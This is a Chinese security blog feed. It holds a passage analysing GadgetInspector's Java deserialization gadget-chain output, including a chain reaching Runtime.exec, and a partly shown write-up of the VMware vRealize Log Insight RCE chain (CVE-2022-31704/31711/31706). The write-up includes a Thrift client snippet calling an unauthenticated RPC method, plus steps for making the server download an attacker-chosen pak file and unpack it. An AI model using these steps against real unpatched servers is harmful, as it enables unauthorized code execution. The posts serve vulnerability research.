class="hljs-regexp">/example/I</span>Fn,java<span class="hljs-regexp">/io/</span>Serializable<span class="hljs-keyword">false</span>f1!<span class="hljs-number">2</span>!org<span class="hljs-regexp">/example/I</span>Fn!f2!<span class="hljs-number">2</span>!org<span class="hljs-regexp">/example/I</span>Fn<br>org<span class="hljs-regexp">/example/</span>FnConstantjava<span class="hljs-regexp">/lang/</span>Objectorg<span class="hljs-regexp">/example/I</span>Fn,java<span class="hljs-regexp">/io/</span>Serializable<span class="hljs-keyword">false</span>value!<span class="hljs-number">2</span>!java<span class="hljs-regexp">/lang/</span>Object<br>org<span class="hljs-regexp">/example/</span>FnEvaljava<span class="hljs-regexp">/lang/</span>Objectorg<span class="hljs-regexp">/example/I</span>Fn,java<span class="hljs-regexp">/io/</span>Serializable<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/I</span>Fnjava<span class="hljs-regexp">/lang/</span>Object<span class="hljs-keyword">true</span><br>org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModeljava/</span>lang<span class="hljs-regexp">/Objectjava/i</span>o<span class="hljs-regexp">/Serializablefalse__clojureFnMap!2!java/u</span>til/HashMap<br>org<span class="hljs-regexp">/example/</span>TestDemojava<span class="hljs-regexp">/lang/</span>Object<span class="hljs-keyword">false</span>test!<span class="hljs-number">2</span>!java<span class="hljs-regexp">/lang/</span>String<br></code></pre></td></tr></table></figure><table><thead><tr><th>类名</th><th>父类名</th><th>实现的所有接口</th><th>是否接口</th><th>成员变量(以!分割)</th></tr></thead><tbody><tr><td>org&#x2F;example&#x2F;FnCompose</td><td>java&#x2F;lang&#x2F;Object</td><td>org&#x2F;example&#x2F;IFn,java&#x2F;io&#x2F;Serializable</td><td>false</td><td>f1!2!org&#x2F;example&#x2F;IFn!f2!2!org&#x2F;example&#x2F;IFn</td></tr></tbody></table><p>成员变量f1!2!org&#x2F;example&#x2F;IFn!表示：字段名称为f1、modifiers为2(private修饰)、变量类型为org&#x2F;example&#x2F;IFn类</p><p>在gadgetinspector中的定义类为gadgetinspector.data.ClassReference、gadgetinspector.data.ClassReference.Member</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/44.png"></p><p>输出方法信息文件methods.dat</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle">org<span class="hljs-regexp">/example/</span>FnCompose&lt;init&gt;(Lorg<span class="hljs-regexp">/example/I</span>Fn;Lorg<span class="hljs-regexp">/example/I</span>Fn;)V<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>FnComposeinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>FnConstant&lt;init&gt;(Ljava<span class="hljs-regexp">/lang/</span>Object;)V<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>FnConstantinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>FnEval&lt;init&gt;()V<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>FnEvalinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/I</span>FninvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModel&lt;init&gt;(Ljava/u</span>til/HashMap;)V<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/m</span>odel/AbstractTableModelhashCode()I<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>TestDemo&lt;init&gt;()V<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>TestDemopMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-keyword">false</span><br>org<span class="hljs-regexp">/example/</span>TestDemocMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-keyword">false</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>方法所在类</th><th>方法名</th><th>方法参数及返回值</th><th>是否静态方法</th></tr></thead><tbody><tr><td>org&#x2F;example&#x2F;FnCompose</td><td>invokeCall</td><td>(Ljava&#x2F;lang&#x2F;Object;)Ljava&#x2F;lang&#x2F;Object;</td><td>false</td></tr></tbody></table><p>在gadgetinspector中的定义类为gadgetinspector.data.MethodReference</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/45.png"></p><p>inheritanceMap.dat  类的继承关系</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModeljava/</span>lang<span class="hljs-regexp">/Objectjava/i</span>o/Serializable<br>org<span class="hljs-regexp">/example/</span>FnComposejava<span class="hljs-regexp">/lang/</span>Objectjava<span class="hljs-regexp">/io/</span>Serializableorg<span class="hljs-regexp">/example/</span>IFn<br>org<span class="hljs-regexp">/example/</span>FnEvaljava<span class="hljs-regexp">/lang/</span>Objectjava<span class="hljs-regexp">/io/</span>Serializableorg<span class="hljs-regexp">/example/</span>IFn<br>org<span class="hljs-regexp">/example/</span>TestDemojava<span class="hljs-regexp">/lang/</span>Object<br>org<span class="hljs-regexp">/example/</span>FnConstantjava<span class="hljs-regexp">/lang/</span>Objectjava<span class="hljs-regexp">/io/</span>Serializableorg<span class="hljs-regexp">/example/</span>IFn<br>org<span class="hljs-regexp">/example/</span>IFnjava<span class="hljs-regexp">/lang/</span>Object<br></code></pre></td></tr></table></figure><p>2、生成passthrough数据流，输出信息文件passthrough.dat</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">org<span class="hljs-regexp">/example/</span>TestDemocMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-number">1</span>,<br>org<span class="hljs-regexp">/example/</span>TestDemopMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-number">1</span>,<br>org<span class="hljs-regexp">/example/</span>FnConstantinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-number">0</span>,   <span class="hljs-number">0</span>是实例<br></code></pre></td></tr></table></figure><table><thead><tr><th>类名</th><th>方法名</th><th>方法描述</th><th>能污染的参数1索引,能污染的参数2索引</th></tr></thead><tbody><tr><td>org&#x2F;example&#x2F;TestDemo</td><td>cMethod</td><td>(Ljava&#x2F;lang&#x2F;String;)Ljava&#x2F;lang&#x2F;String;</td><td>1,</td></tr></tbody></table><p>3、生成passthrough调用图，输出信息文件callgraph.dat</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gradle">org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModelhashCode()Iorg/</span>example<span class="hljs-regexp">/IFninvokeCall(Ljava/</span>lang<span class="hljs-regexp">/Object;)Ljava/</span>lang/Object;<span class="hljs-number">0</span>__clojureFnMap<span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModelhashCode()Ijava/u</span>til/HashMaphashCode()I<span class="hljs-number">0</span>__clojureFnMap<span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>TestDemopMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;org<span class="hljs-regexp">/example/</span>TestDemocMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-number">1</span><span class="hljs-number">1</span><br>org<span class="hljs-regexp">/example/</span>TestDemopMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;org<span class="hljs-regexp">/example/</span>TestDemocMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-number">0</span><span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>TestDemocMethod(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>String;java<span class="hljs-regexp">/lang/</span>StringtoUpperCase()Ljava<span class="hljs-regexp">/lang/</span>String;<span class="hljs-number">1</span><span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>FnCompose&lt;init&gt;(Lorg<span class="hljs-regexp">/example/I</span>Fn;Lorg<span class="hljs-regexp">/example/I</span>Fn;)Vjava<span class="hljs-regexp">/lang/</span>Object&lt;init&gt;()V<span class="hljs-number">0</span><span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModel&lt;init&gt;(Ljava/u</span>til<span class="hljs-regexp">/HashMap;)Vjava/</span>lang/Object&lt;init&gt;()V<span class="hljs-number">0</span><span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>FnEvalinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;java<span class="hljs-regexp">/lang/</span><span class="hljs-keyword">Runtime</span>exec(Ljava<span class="hljs-regexp">/lang/</span>String;)Ljava<span class="hljs-regexp">/lang/</span>Process;<span class="hljs-number">1</span><span class="hljs-number">1</span><br>org<span class="hljs-regexp">/example/</span>FnComposeinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;org<span class="hljs-regexp">/example/I</span>FninvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-number">1</span><span class="hljs-number">1</span><br>org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModelhashCode()Ijava/u</span>til<span class="hljs-regexp">/HashMapget(Ljava/</span>lang<span class="hljs-regexp">/Object;)Ljava/</span>lang/Object;<span class="hljs-number">0</span>__clojureFnMap<span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>TestDemo&lt;init&gt;()Vjava<span class="hljs-regexp">/lang/</span>Object&lt;init&gt;()V<span class="hljs-number">0</span><span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>FnComposeinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;org<span class="hljs-regexp">/example/I</span>FninvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-number">0</span>f2<span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>FnComposeinvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;org<span class="hljs-regexp">/example/I</span>FninvokeCall(Ljava<span class="hljs-regexp">/lang/</span>Object;)Ljava<span class="hljs-regexp">/lang/</span>Object;<span class="hljs-number">0</span>f1<span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/</span>FnEval&lt;init&gt;()Vjava<span class="hljs-regexp">/lang/</span>Object&lt;init&gt;()V<span class="hljs-number">0</span><span class="hljs-number">0</span><br>org<span class="hljs-regexp">/example/m</span>odel<span class="hljs-regexp">/AbstractTableModelhashCode()Iorg/</span>example<span class="hljs-regexp">/IFninvokeCall(Ljava/</span>lang<span class="hljs-regexp">/Object;)Ljava/</span>lang/Object;<span class="hljs-number">0</span><span class="hljs-number">1</span><br>org<span class="hljs-regexp">/example/</span>FnConstant&lt;init&gt;(Ljava<span class="hljs-regexp">/lang/</span>Object;)Vjava<span class="hljs-regexp">/lang/</span>Object&lt;init&gt;()V<span class="hljs-number">0</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>4、搜索可用的source，输出信息文件sources.dat</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">org<span class="hljs-regexp">/example/m</span>odel/AbstractTableModelhashCode()I<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>5、搜索生成调用链，输出结果文件gadget-chains.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">org/apache/log4j/pattern/LogEvent.readObject(Ljava/io/ObjectInputStream;)V (1)<br>  org/apache/log4j/pattern/LogEvent.readLevel(Ljava/io/ObjectInputStream;)V (1)<br>  java/lang/reflect/Method.invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object; (0)<br><br>org/apache/log4j/spi/LoggingEvent.readObject(Ljava/io/ObjectInputStream;)V (1)<br>  org/apache/log4j/spi/LoggingEvent.readLevel(Ljava/io/ObjectInputStream;)V (1)<br>  java/lang/reflect/Method.invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object; (0)<br><br>//最终生成的反序列化链<br>org/example/model/AbstractTableModel.hashCode()I (0)<br>  org/example/FnEval.invokeCall(Ljava/lang/Object;)Ljava/lang/Object; (1)<br>  java/lang/Runtime.<span class="hljs-built_in">exec</span>(Ljava/lang/String;)Ljava/lang/Process; (1)<br><br></code></pre></td></tr></table></figure><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/46.png"></p><h2 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h2><p>在花了几周时间分析完该项目后，对于利用ASM技术、JVM指令、模拟栈调用等解决静态扫描的问题有了一些认知了解。当然在分析过程中也发现该工具的一些弊端或者说是bug，如Transient修饰字段处理逻辑、广度优先的搜索策略、source源&#x2F;sink源不完善等问题。而搞清楚问题之后下一步就是解决问题、完善代码逻辑。另外GadgetInspector直接分析war&#x2F;jar的方式比较贴合平时做漏洞挖掘的工作场景，如在一线攻防演练时拿到了java war包，由于项目周期短 可能急需一个点撕开防守的口子，这时候扫描工具可以帮助我们快速做一些基础分析的工作，基于我们提前指定的source源、sink漏洞点分析拿到项目的所有路由、可能存在的攻击链路，而具体漏洞EXP利用的构造交给我们自己。相信随着规则的完善，也会很大的辅助增强我们审计挖掘的效率。所以在完善gadget的扫描逻辑后也考虑基于此工具二开以简化平时一些常规漏洞的挖掘审计工作。写到这里 成文已经又臭又长，不再赘述了。下一步的todo-list就是着重代码逻辑完善、规则优化、常规漏洞挖掘等相关问题。安全路漫漫~</p>]]></content>
    
    
    <categories>
      
      <category>自动化审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSec</tag>
      
      <tag>静态分析</tag>
      
      <tag>GadgetInspector</tag>
      
      <tag>自动化审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VMware-vRealize-Log-Insight-CVE漏洞追踪</title>
    <link href="/2023/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/"/>
    <url>/2023/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/</url>
    
    <content type="html"><![CDATA[<blockquote><p>23年1月份，vmware官方发布了开年第一份安全通告VMSA-2023-0001，修复了VMware-vRealize-Log-Insight 产品中的4个漏洞，其中CVE-2022-31704、CVE-2022-31711、CVE-2022-31706可组合达到rce的效果。近期相关厂商公布了漏洞的细节及检测的POC，我也将当时的分析思路整理脱敏成文发出来。当中涉及到了Apache thrift、rpc调用、python tarfile解压目录穿越等知识。本文不提供任何与漏洞相关的POC及EXP，文章仅用于技术交流，请勿用于非法用途！</p></blockquote><p>本文涉及的全部漏洞，官方均已完全修复，产品所属厂商也已发布安全公告及修复版本</p><p>安全公告：<a href="https://www.vmware.com/security/advisories/VMSA-2023-0001.html">https://www.vmware.com/security/advisories/VMSA-2023-0001.html</a></p><p>修复版本： VMware vRealize Log Insight 8.10.2，地址：<a href="https://customerconnect.vmware.com/downloads/details?downloadGroup=VRLI-8102&amp;productId=1351">https://customerconnect.vmware.com/downloads/details?downloadGroup=VRLI-8102&amp;productId=1351</a></p><p> <strong>PS：本文仅用于技术讨论。严禁用于任何非法用途，违者后果自负。</strong></p><h2 id="1、环境部署"><a href="#1、环境部署" class="headerlink" title="1、环境部署"></a>1、环境部署</h2><p>官方下载VMware-vRealize-Log-Insight-8.10.0.0-20623770_OVF10.ova，导入vmware启动部署</p><p><a href="https://192.168.232.200/admin/startup?view=deployment">https://192.168.232.200/admin/startup?view=deployment</a></p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/1.png"></p><p>保存配置下一步后成功启动</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/2.png"></p><p>搭建成功</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/3.png"></p><h2 id="2、环境调试"><a href="#2、环境调试" class="headerlink" title="2、环境调试"></a>2、环境调试</h2><p>与其它环境无差别，找启动脚本，添加调试配置后重新启动</p><p>修改启动脚本：&#x2F;usr&#x2F;lib&#x2F;loginsight&#x2F;application&#x2F;sbin&#x2F;loginsight-daemon.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">1、将这几行注释<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;STRATA_PGID&#125;</span>&quot;</span> ]; <span class="hljs-keyword">then</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Cannot determine Strata service process group ID.&quot;</span> &gt; /dev/stderr</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">   <span class="hljs-built_in">exit</span> 1</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">fi</span></span><br><br>2、添加调试语句<br>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 \<br><br>3、kill掉进程并重启<br>netstat -anltp|grep 16520<br>kill -9 pid<br><span class="hljs-meta prompt_">[/usr/lib/loginsight/application/sbin]#</span><span class="language-bash">./loginsight-daemon.sh</span><br><br>4、上述操作完等几分钟就能看到16520、5005端口都开起来了，iptables放行端口<br>iptables -A INPUT -p tcp --dport 5005 -j ACCEPT<br>iptables -A OUTPUT -p tcp --sport 5005 -j ACCEPT<br></code></pre></td></tr></table></figure><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/4.png"></p><p>idea远程调试连接即可</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/5.png"></p><h2 id="3、官方公告"><a href="#3、官方公告" class="headerlink" title="3、官方公告"></a>3、官方公告</h2><p><a href="https://www.vmware.com/security/advisories/VMSA-2023-0001.html">https://www.vmware.com/security/advisories/VMSA-2023-0001.html</a></p><p>一共4个漏洞</p><p>CVE-2022-31706 目录遍历</p><p>CVE-2022-31704 失效的访问控制</p><p>CVE-2022-31710 反序列化，可能导致拒绝服务</p><p>CVE-2022-31711  信息泄露，可收集敏感会话和应用程序信息 </p><p>漏洞版本：8.10.0、安全修复版本：8.10.2，以下分析都是基于VMware-vRealize-Log-Insight-8.10.0.0-20623770版本</p><h2 id="4、漏洞追踪"><a href="#4、漏洞追踪" class="headerlink" title="4、漏洞追踪"></a>4、漏洞追踪</h2><p>由于没授权下载不到漏洞对应的补丁包，没法直接从修复方案入手。从horizon3的<a href="https://www.horizon3.ai/vmware-vrealize-cve-2022-31706-iocs/">https://www.horizon3.ai/vmware-vrealize-cve-2022-31706-iocs/</a> 看到有几个关键词：端口16520-16580、thrift、tar、pak</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/6.png"></p><p>根据Apache thrift官方出的示例：<a href="https://thrift.apache.org/tutorial/java.html">https://thrift.apache.org/tutorial/java.html</a> 完整的一次RPC调用过程存在client、server、handler几个关键类( <a href="https://gitbox.apache.org/repos/asf?p=thrift.git;a=tree;f=tutorial/java/src;hb=HEAD">https://gitbox.apache.org/repos/asf?p=thrift.git;a=tree;f=tutorial/java/src;hb=HEAD</a> )。方法的定义在Iface接口中、方法的实现在handler类中，开发者可以通过编写**.thrift文件**生成client、server类代码；也可以根据实例编写client及server类。本次复现漏洞只需要client类能够调用目标方法即可，所以参考示例写了一个client类(见后文)</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/7.png"></p><p>pid为16520的java进程启动参数：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/loginsight/</span>application<span class="hljs-regexp">/3rd_party/</span>bin<span class="hljs-regexp">/java -Xrs -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/</span>storage<span class="hljs-regexp">/core/</span>loginsight<span class="hljs-regexp">/var/</span>heapdump<span class="hljs-regexp">/li_heapdump.hprof -XX:ErrorFile=/</span>storage<span class="hljs-regexp">/core/</span>loginsight<span class="hljs-regexp">/var/</span>jvm_hs_err_pid.log <br>-Djava.util.logging.config.level=SEVERE -Djdk.tls.ephemeralDHKeySize=<span class="hljs-number">2048</span> <br>-Dorg.bouncycastle.fips.approved_only=<span class="hljs-keyword">false</span> -Djavax.net.ssl.trustStorePassword=changeit -Djdk.http.auth.tunneling.disabledSchemes=<span class="hljs-string">&quot;&quot;</span> -DLOGINSIGHT_HOME=<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/loginsight -Dstrata.pgid=2020 -cp /u</span>sr<span class="hljs-regexp">/lib/</span>loginsight<span class="hljs-regexp">/application/</span>lib<span class="hljs-comment">/* </span><br><span class="hljs-comment">-Xmx3988m -Xms3988m -Xss256k -Xmn1024M -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+ScavengeBeforeFullGC -XX:TargetSurvivorRatio=80 -XX:SurvivorRatio=8 -XX:MaxTenuringThreshold=15 -XX:ParallelGCThreads=4 -XX:+UseCompressedOops -XX:+OptimizeStringConcat -XX:+AlwaysPreTouch -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 com.vmware.loginsight.daemon.LogInsightDaemon </span><br><span class="hljs-comment">--wait=120</span><br></code></pre></td></tr></table></figure><p>启动类为com.vmware.loginsight.daemon.LogInsightDaemon，定义在&#x2F;application&#x2F;lib&#x2F;daemon-service-li.jar中，看main方法的代码：前面进行一系列config配置，最后进入同类下的run方法进行启动</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/8.png"></p><p>com.vmware.loginsight.daemon.LogInsightDaemon#run调用同类下的startThriftServer启动服务</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/9.png"></p><p>这里传入DaemonCommandsHandler对象，这个类就是我们上面提到的handler类，其实现了Iface接口</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/10.png"></p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/11.png"></p><p>客户端可调用的方法都在Iface接口中定义，而在DaemonCommandsHandler类中实现方法逻辑</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/12.png"></p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/13.png"></p><p>那么我们就可以猜测 CVE-2022-31704 访问控制失效漏洞指的是未授权用户可以rpc调用服务端提供的方法！先测试下</p><p>按照官网提供的示例代码( <a href="https://thrift.apache.org/tutorial/java.html">https://thrift.apache.org/tutorial/java.html</a> )，自己写一个client调用下getClusterCertificate方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">TTransport transport;<br>transport = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TSocket(<span class="hljs-string">&quot;192.168.232.200&quot;</span>, 16520)</span>;<br>transport.<span class="hljs-keyword">open</span><span class="hljs-literal">()</span>;<br>TProtocol protocol = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TBinaryProtocol(<span class="hljs-params">transport</span>)</span>;<br>DaemonCommands.Client client = <span class="hljs-keyword">new</span> DaemonCommands.<span class="hljs-constructor">Client(<span class="hljs-params">protocol</span>)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(client.get<span class="hljs-constructor">ClusterCertificate()</span>);;<br>transport.close<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/14.png"></p><p>发现报错<code>Socket is closed by peer</code>，根据<a href="https://blog.csdn.net/xiaoyaoxiaozi007/article/details/107323857">https://blog.csdn.net/xiaoyaoxiaozi007/article/details/107323857</a> 加上<code>TTransport tTransport = new TFramedTransport(transport);</code>解决了。成功拿到getClusterCertificate方法的执行返回结果</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/15.png"></p><p>接着看如何实现RCE，horizon3提到日志中download、pak相关内容，经检索反编译后代码定位到com.vmware.loginsight.daemon.commands.SystemCommands#remotePakDownloadCommand</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/16.png"></p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/17.png"></p><p>往上回溯到com.vmware.loginsight.daemon.DaemonCommandsHandler#requestCommand中有调用，而此方法在thrift client可以直接调用</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/18.png"></p><p>传入的参数类型是com.vmware.loginsight.daemon.protocol.commands.RemotePakDownloadCommand，需要设置属性requestUrl(下载路径)、fileName(本地保存文件名)、sourceNodeToken(节点token值)。先检查token是否一致，如果一致则系统从远端拉取文件保存至&#x2F;tmp&#x2F;目录，中间未对文件及地址进行检查</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/19.png"></p><p>那这里的token从哪里取呢，答案也是通过thrift client调用方法进行获取。从上往下依次查看可获取信息的方法，发现<code>get*</code>方法可以拿到nodeToken</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/20.png"></p><p>拿到之后，我们就可以继续调用RemotePakDownloadCommand，需要设置Command#commandType、Command#remotePakDownloadCommand两个属性值</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/21.png"></p><p>根据如上信息，编写thrift client调用requestCommand方法，成功请求我们传入的外部地址</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/22.png"></p><p>因为我们还没制作满足格式要求的pak文件，所以显示404。RemotePakDownloadCommand方法仅仅是将pak文件下载到本地&#x2F;tmp目录，要完成RCE 还需要解压释放操作。再次查看thrift client可调用的方法中关于pak的操作，还有个com.vmware.loginsight.daemon.commands.SystemCommands#pakUpgradeCommand方法，跟进查看下，该方法根据客户端传入参数，最终调用&#x2F;opt&#x2F;vmware&#x2F;bin&#x2F;loginsight-pak-upgrade脚本执行解压操作</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/23.png"></p><p>&#x2F;opt&#x2F;vmware&#x2F;bin&#x2F;loginsight-pak-upgrade又调用了&#x2F;usr&#x2F;lib&#x2F;loginsight&#x2F;application&#x2F;sbin&#x2F;loginsight-pak-upgrade.py进行处理</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/24.png"></p><p>看脚本的usage，确实是处理pak文件的</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/25.png"></p><p>而这里又涉及了python tarfile 